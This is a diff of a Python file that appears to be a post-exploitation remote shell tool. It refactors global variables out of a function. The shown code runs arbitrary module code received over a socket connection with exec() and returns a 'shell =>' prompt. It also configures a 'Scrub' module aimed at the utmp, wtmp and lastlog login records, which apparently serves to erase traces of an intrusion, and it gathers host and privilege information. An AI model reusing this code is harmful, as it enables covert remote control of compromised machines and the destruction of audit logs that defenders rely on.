@@ -23,8 +23,33 @@ from math import log
 
 
 
+socksize = 4096                            
+activePID = []
+
+now = datetime.datetime.now()
+logtime = (str(now.month)+"-"+str(now.day)+"-"+str(now.year)+" @ "+str(now.hour)+":"+str(now.minute))
+
+## Global variables for remote shells are defined during the creation process
+## Variables for Scrub module. Do not change unless you know what you're doing. 
+UTMP_STRUCT_SIZE    = 384
+LASTLOG_STRUCT_SIZE = 292
+UTMP_FILEPATH       = "/var/run/utmp"
+WTMP_FILEPATH       = "/var/log/wtmp"
+LASTLOG_FILEPATH    = "/var/log/lastlog"
+
+    ## Get user and environment information
+distro = os.uname()[1]
+distro2 = platform.linux_distribution()[0]
+Home_Dir = os.environ['HOME']
+User_Ip_Address = socket.gethostbyname(socket.gethostname())
+if os.geteuid() != 0:
+    currentuser = "nonroot"
+else:
+    currentuser = "root"
+    
+
 def module_handler(module, modname):
-    status_msg("[+] Module: %s\n" % modname)
+    status_msg("\n[+] Module: %s" % modname)
     status_msg("[+] Start time: %s" % logtime)
     exec(module)
     connection.send("shell => ")
@@ -167,44 +192,4 @@ def main():
     connection.close() 
     sys.exit(0)
 
-
-def globalvars():
-    global Home_Dir
-    global User_Ip_Address
-    global UTMP_STRUCT_SIZE    
-    global LASTLOG_STRUCT_SIZE
-    global UTMP_FILEPATH      
-    global WTMP_FILEPATH       
-    global LASTLOG_FILEPATH
-    global distro
-    global distro2
-    global currentuser
-    global socksize
-    global logtime
-    global connection
-    global HOST
-    global PORT
-
-    socksize = 4096                            
-
-    now = datetime.datetime.now()
-    logtime = (str(now.month)+"-"+str(now.day)+"-"+str(now.year)+" @ "+str(now.hour)+":"+str(now.minute))
-
-    ## Global variables for remote shells are defined during the creation process
-    ## Variables for Scrub module. Do not change unless you know what you're doing. 
-    UTMP_STRUCT_SIZE    = 384
-    LASTLOG_STRUCT_SIZE = 292
-    UTMP_FILEPATH       = "/var/run/utmp"
-    WTMP_FILEPATH       = "/var/log/wtmp"
-    LASTLOG_FILEPATH    = "/var/log/lastlog"
-
-    ## Get user and environment information
-    distro = os.uname()[1]
-    distro2 = platform.linux_distribution()[0]
-    Home_Dir = os.environ['HOME']
-    User_Ip_Address = socket.gethostbyname(socket.gethostname())
-    if os.geteuid() != 0:
-        currentuser = "nonroot"
-    else:
-        currentuser = "root"
 
